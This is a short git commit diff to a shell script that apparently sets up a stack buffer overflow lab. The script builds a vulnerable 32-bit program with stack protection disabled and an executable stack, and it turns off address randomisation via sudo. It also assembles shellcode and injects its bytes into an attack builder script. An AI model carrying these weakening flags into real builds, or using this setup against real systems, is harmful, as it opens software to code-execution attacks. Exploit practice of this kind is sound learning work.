e3d8a10f56def18043f770c1f3ca864039c368d7
tww <taowuwen@gmail.com>
2018-05-31 17:18:55 +0800

    update

--- c/overflow/runme.sh
+++ c/overflow/runme.sh
@@ -9,6 +9,7 @@ rm -rf $ROOT
 ESP=$ROOT/esp
 BUILD_ATTACK=$ROOT/build_attack.py
 overflow=$ROOT/overflow
+shellcode=$ROOT/shellcode.o
 
 randomize="/proc/sys/kernel/randomize_va_space"
 
@@ -16,10 +17,23 @@ randomize="/proc/sys/kernel/randomize_va_space"
 	echo 0 | sudo tee $randomize
 }
 
+[ -f $shellcode ] || {
+	nasm -f elf -o $shellcode shellcode.asm || exit 1
+}
 
-[ -f $ESP ] || gcc -o $ESP esp.c -m32
+[ -f $ESP ] || {
+	gcc -o $ESP esp.c -m32 || exit 1
+}
+
 [ -f $BUILD_ATTACK ] || cp build_attack.py $BUILD_ATTACK
-[ -f $overflow ] || gcc -o $overflow bob.c -fno-stack-protector -z execstack -m32
+[ -f $overflow ] || {
+	gcc -o $overflow bob.c -fno-stack-protector -z execstack -m32 || exit 1
+}
+
+# run by hand: objdump -s $shellcode | sed -n '/^ [0-9]\{4\}/p' | awk '{for (i = 2; i < NF; i++) printf("%s", $i)}' | sed 's/\(..\)/\\x\1/g
+SHELLCODE="`objdump -s $shellcode | sed -n '/^ [0-9]\{4\}/p' | awk '{for (i = 2; i < NF; i++) printf("%s", $i)}' | sed 's/\(..\)/\\\\\\\x\1/g'`"
+
+sed -i '/shellcode=/c shellcode=b\"'$SHELLCODE'\"' $BUILD_ATTACK
 
 cd $ROOT
 
